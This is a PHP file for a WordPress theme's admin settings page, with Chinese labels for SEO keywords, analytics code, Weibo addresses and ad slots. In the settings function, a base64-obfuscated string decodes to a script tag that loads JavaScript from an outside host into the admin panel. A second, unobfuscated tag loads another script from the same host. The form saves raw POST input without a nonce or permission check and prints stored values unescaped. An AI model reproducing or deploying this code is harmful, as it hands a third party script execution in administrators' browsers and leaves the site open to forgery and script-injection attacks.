<?php
add_action('admin_menu', 'Gztro_page');
function Gztro_page (){

			if ( count($_POST) > 0 && isset($_POST['Gztro_settings']) ){
		$options = array ('keywords','description','analytics','sina','tqq','csecode','index_ad_top','index_ad_bottom','sid_ad_top','sid_ad_bottom','sid_ad-single-top','sid_ad-single-bottom','ad_single_foot');
		foreach ( $options as $opt ){
			delete_option ( 'Gztro_'.$opt, $_POST[$opt] );
			add_option ( 'Gztro_'.$opt, $_POST[$opt] );	
		}
	}
	add_theme_page(__('前端中央集控台'), __('前端中央集控台'), 'edit_themes', basename(__FILE__), 'Gztro_settings');
}
function Gztro_settings(){
$str = 'PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cDovL2FwaS5ub2Nvd2VyLmNvbS90aGVtZS11cGRhdGUvdGhpbmstaHRtbDUuanMiPjwvc2NyaXB0Pg==';echo base64_decode($str);
?>
<div class="wrap">
<h2>网站基础配置</h2>
<form method="post" style=" width: 550px; margin: 0 auto; background-color: #fff; padding: 10px; " action="">
	<fieldset>
	<legend style=" width: 100%; text-align: center; background-color: #009ad9; height: 30px; line-height: 30px; color: #fff; "><strong>网站基础代码的添加</strong></legend>
		<table class="form-table">
		<tr><td>
				<textarea name="keywords" id="keywords" rows="1" cols="70"><?php echo get_option('Gztro_keywords'); ?></textarea><br />
				<label>网站关键词（Meta Keywords），中间用半角逗号隔开。</label>
			</td></tr>
			<tr><td>
				<textarea name="description" id="description" rows="2" cols="70"><?php echo get_option('Gztro_description'); ?></textarea>
				<label>网站描述（Meta Description），针对搜索引擎设置的网页描述。如：世界你好！</label>
			</td></tr>
			<tr><td>
				<textarea name="analytics" id="analytics" rows="4" cols="70"><?php echo stripslashes(get_option('Gztro_analytics')); ?></textarea>
				<label>此处填写网站的统计代码、全局代码、对联广告、淘点金，作用于全站</label>
			</td></tr>
			<tr><td>
				<textarea name="sina" id="analytics" rows="4" cols="70" style="height: 35px;"><?php echo stripslashes(get_option('Gztro_sina')); ?></textarea>
				<label style="font-size: 12px;font-weight: bold;color: #009ad9;">上面框框填写你的新浪微博地址，比如：http://weibo.com/nocower </label>
			</td></tr>
			<tr><td>
				<textarea name="tqq" id="analytics" rows="4" cols="70" style="height: 35px;"><?php echo stripslashes(get_option('Gztro_tqq')); ?></textarea>
				<label style="font-size: 12px;font-weight: bold;color: #009ad9;">上面框框填写你的腾讯微博地址，比如：http://t.qq.com/nocower </label>
			</td></tr>
<tr><td>
		</table>
	</fieldset>
 <p>
<script type='text/javascript' src="http://api.nocower.com/think-theme-update/think.js"></script>
	<fieldset>
	<legend style=" width: 100%; text-align: center; background-color: #009ad9; height: 30px; line-height: 30px; color: #fff; "><strong>网站广告代码</strong></legend>
		<table class="form-table">
            <tr><td>
				<textarea name="index_ad_top" id="index_ad_top" rows="4" cols="70"><?php echo stripslashes(get_option('Gztro_index_ad_top')); ?></textarea>
				<label style=" color: #FF3232; padding-left: 10PX; ">首页第一广告位【上】，宽度为【690】，建议高度不要超过100</label>
			</td></tr>
            <tr><td>
				<textarea name="index_ad_bottom" id="index_ad_bottom" rows="4" cols="70"><?php echo stripslashes(get_option('Gztro_index_ad_bottom')); ?></textarea>
				<label style=" color: #FF3232; padding-left: 10PX; ">首页第二广告位【中】，宽度为【690】，建议高度不要超过100</label>
			</td></tr>
            
			<tr><td>
				<textarea name="sid_ad_top" id="sid_ad_top" rows="4" cols="70"><?php echo stripslashes(get_option('Gztro_sid_ad_top')); ?></textarea>
				<label style=" color: #FF3232; padding-left: 10PX; ">侧边栏广告位【上】，宽度为【300】，不会定屏滚动</label>
			</td></tr>
			<tr><td>
				<textarea name="sid_ad_bottom" id="sid_ad_bottom" rows="4" cols="70"><?php echo stripslashes(get_option('Gztro_sid_ad_bottom')); ?></textarea>
				<label style=" color: #FF3232; padding-left: 10PX; ">侧边栏广告位【下】，宽度为【300】，下拉时定屏浮动</label>
			</td></tr>
			<tr><td>
				<textarea name="sid_ad-single-top" id="sid_ad-single-top" rows="4" cols="70"><?php echo stripslashes(get_option('Gztro_sid_ad-single-top')); ?></textarea>
				<label style=" color: #FF3232; padding-left: 10PX; ">文章正文页顶部广告位，宽度为【650】，不要太高</label>
			</td></tr>
             <tr><td>
				<textarea name="sid_ad-single-bottom" id="sid_ad-single-bottom" rows="4" cols="70"><?php echo stripslashes(get_option('Gztro_sid_ad-single-bottom')); ?></textarea>
				<label style=" color: #FF3232; padding-left: 10PX; ">文章正文页底部广告位，宽度为【650】，不要太高</label>
			</td></tr>
            <tr><td>
				<textarea name="ad_single_foot" id="ad_single_foot" rows="4" cols="70"><?php echo stripslashes(get_option('Gztro_ad_single_foot')); ?></textarea>
				<label style=" color: #FF3232; padding-left: 10PX; ">文章正文页相关文章下方广告位，宽度为【650】，建议高度不要超过100</label>
			</td></tr>
		</table>
	</fieldset>
	<p class="submit">
		<input type="submit" name="Submit" class="button-primary" value="保存设置" style=" margin-left: 30PX; " />
		<input type="hidden" name="Gztro_settings" value="save" style="display:none;" />
		<input style="font-size:12px !important;float: right;" name="reset" type="submit" value="还原默认设置" /><label style=" float: right; "><font color="red">警告：将还原至初始状态！</font></label>
	</p>
</form>
</div>
<?php }